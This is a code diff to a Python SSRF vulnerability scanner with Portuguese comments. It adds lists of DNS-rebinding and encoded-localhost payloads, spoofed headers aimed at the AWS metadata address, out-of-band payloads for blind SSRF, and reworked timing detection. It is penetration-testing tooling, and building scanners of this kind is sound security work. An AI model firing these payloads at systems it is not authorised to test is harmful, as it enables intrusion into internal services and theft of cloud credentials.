@@ -65,21 +65,69 @@ class SSRFScanner:
             "dict://127.0.0.1:11211/",
             "ldap://127.0.0.1"
         ]
-        
+
+        # Payloads de DNS rebinding para bypass de proteção de rede
+        self.dns_rebinding_payloads = [
+            "http://127.0.0.1.nip.io",
+            "http://127.0.0.1.xip.io",
+            "http://0x7f000001.xip.io",
+            "http://1.0.0.127.xip.io",
+            "http://spoofed.burpcollaborator.net",
+            # Notação decimal alternativa
+            "http://2130706433",  # 127.0.0.1 em decimal
+            "http://017700000001",  # 127.0.0.1 em octal
+            "http://0x7f.0x0.0x0.0x1",  # 127.0.0.1 em hex
+            # Encurtamento de URL que resolve para 127.0.0.1
+            "http://localtest.me",
+            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
+        ]
+
+        # Headers extras para simular IMDSv2 (AWS Instance Metadata Service v2)
+        self.imdsv2_headers = {
+            "X-Forwarded-For": "169.254.169.254",
+            "X-Real-IP": "169.254.169.254",
+            "X-Client-IP": "169.254.169.254",
+            "CF-Connecting-IP": "169.254.169.254",
+        }
+
         self.logger = get_logger(__name__)
         self.console = Console()
+        self._oast_client = None  # Inicializado sob demanda via set_oast_client()
+
+    def set_oast_client(self, oast_client) -> None:
+        """
+        Configura um OASTClient para detecção de SSRF blind.
+
+        Args:
+            oast_client: instância de spectra.utils.oast.OASTClient
+        """
+        self._oast_client = oast_client
+        if oast_client.is_available:
+            oast_host = oast_client.generate_host(label="ssrf")
+            oast_payload = f"http://{oast_host}"
+            if oast_payload not in self.payloads:
+                self.payloads.insert(0, oast_payload)
+            # Adiciona variantes de protocolo OAST
+            for proto in ("https", "ftp", "gopher"):
+                variant = f"{proto}://{oast_host}"
+                if variant not in self.payloads:
+                    self.payloads.insert(1, variant)
+            self.logger.info(f"OAST SSRF configurado: {oast_host}")
 
     def _scan_target(self, url, method, param, form_data=None):
         """Escaneia um parâmetro específico para SSRF"""
         for payload in self.payloads:
             try:
                 test_data = {param: payload}
+                # Mede o tempo do 1º request (evita double-request do timing check)
+                start_time = time.time()
                 if method.lower() == 'get':
                     response = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
                 else:
                     post_payload = form_data.copy() if form_data else {}
                     post_payload[param] = payload
                     response = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
+                response_time = time.time() - start_time
                 
                 # Detecção de SSRF através de indicadores na resposta
                 ssrf_indicators = [
@@ -112,7 +160,8 @@ class SSRFScanner:
                     "root:x:0:0:",
                     "daemon:x:1:1:",
                     "# localhost",
-                    "127.0.0.1",
+                    # Nota: "127.0.0.1" removido — é texto muito comum em HTML legítimo
+                    # gerando falsos positivos sistemáticos
                     
                     # Network services
                     "SSH-2.0",
@@ -180,39 +229,27 @@ class SSRFScanner:
                             self.vulnerable_points.append(finding)
                         return
                         
-                # Detecção por timing anômalo (pode indicar conexão interna bem-sucedida)
-                start_time = time.time()
-                try:
-                    if method.lower() == 'get':
-                        response2 = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
-                    else:
-                        response2 = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
+                # Detecção por timing anômalo usando o tempo do 1º request (sem double-request)
+                # Se a resposta demorou mais que o normal mas menos que timeout
+                if 3.0 < response_time < (self.timeout - 1):
+                    timing_finding = {
+                        "Risco": "Baixo",
+                        "Tipo": "Possível SSRF (Timing-based)",
+                        "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+                        "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
+                        "Payload": payload,
+                        "Response_Time": round(response_time, 3),
+                        "Response_Length": len(response.text),
+                        "Status_Code": response.status_code,
+                        "Detection_Method": "Timing-based",
+                        "Evidence": f"Delay anômalo de {response_time:.2f}s detectado",
+                        "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
+                        "Method": method.upper(),
+                        "Confidence": "Low"
+                    }
                     
-                    response_time = time.time() - start_time
-                    
-                    # Se a resposta demorou mais que o normal mas menos que timeout
-                    if 3.0 < response_time < (self.timeout - 1):
-                        timing_finding = {
-                            "Risco": "Baixo",
-                            "Tipo": "Possível SSRF (Timing-based)",
-                            "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
-                            "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
-                            "Payload": payload,
-                            "Response_Time": round(response_time, 3),
-                            "Response_Length": len(response2.text),
-                            "Status_Code": response2.status_code,
-                            "Detection_Method": "Timing-based",
-                            "Evidence": f"Delay anômalo de {response_time:.2f}s detectado",
-                            "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
-                            "Method": method.upper(),
-                            "Confidence": "Low"
-                        }
-                        
-                        if timing_finding not in self.vulnerable_points:
-                            self.vulnerable_points.append(timing_finding)
-                            
-                except requests.RequestException:
-                    pass
+                    if timing_finding not in self.vulnerable_points:
+                        self.vulnerable_points.append(timing_finding)
                     
             except requests.RequestException:
                 continue
